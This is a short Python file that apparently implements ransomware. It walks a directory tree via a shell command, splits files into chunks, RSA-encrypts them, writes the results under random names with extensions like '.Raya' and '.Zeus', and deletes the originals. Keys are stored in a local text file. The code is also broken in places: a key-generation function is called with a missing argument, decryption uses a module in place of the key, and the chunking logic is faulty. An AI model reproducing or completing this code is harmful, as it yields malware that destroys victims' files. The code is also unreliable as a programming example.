import os
import random
import subprocess
from rsa import key, pkcs1


def make_keys(self) -> tuple:
    return key.newkeys(2048)


def cut(dir) -> list:
    data_list = []
    with open(dir, 'rb') as file:
        data = file.read()
        file.close()

    scop, r = len(data) // 200, len(data) % 200
    count = 0
    for i in range(1, scop + 1):
        data_list.append(data[count: i * scop])
        count = scop * i
    data_list.append(data[-r:])


    return data_list


class Fdir:
    def __init__(self, root_dir):
        self.current_dir = root_dir
        print(f'find directorys of {self.current_dir}')


    def find_dirs(self):
        output = str(subprocess.check_output(f'dir /s /b {self.current_dir}', shell=True))[2:-1].split('\\n')[0:-1]

        return output


class KeysEnc:
    def __init__(self) -> None:
        self.keys = make_keys()


    def key_recovery(self) -> None:
        with open('Rkeys.txt', 'a') as file:
            file.write(str(self.keys[0]))
            file.write(str(self.keys[1]))


    def encrypt(self, data) -> bytes:
        enc_data = pkcs1.encrypt(data, self.keys[0])

        return enc_data


class KeysDec:
    def __init__(self, pri, encdata) -> None:
        self.key = pri
        self.data = encdata

    def decrypt(self) -> bytes:
        dec_data = pkcs1.decrypt(self.data, key)

        return dec_data


class Partition:

    def __init__(self, direc):
        self.file_dir = direc


    def part(self):
        return cut(self.file_dir)


class Makefile:
    def __init__(self, data, name, dir):
        self.data = data
        self.fname = name
        self.ddir = dir


    def make(self):
        with open(self.fname + '|=|' + str(random.randint(10000, 10000000)) + random.choice(['.Raya', '.Zeus', '.Menelaos']), 'wb') as file:
            file.write(self.data)
            file.close()
        os.remove(self.ddir)


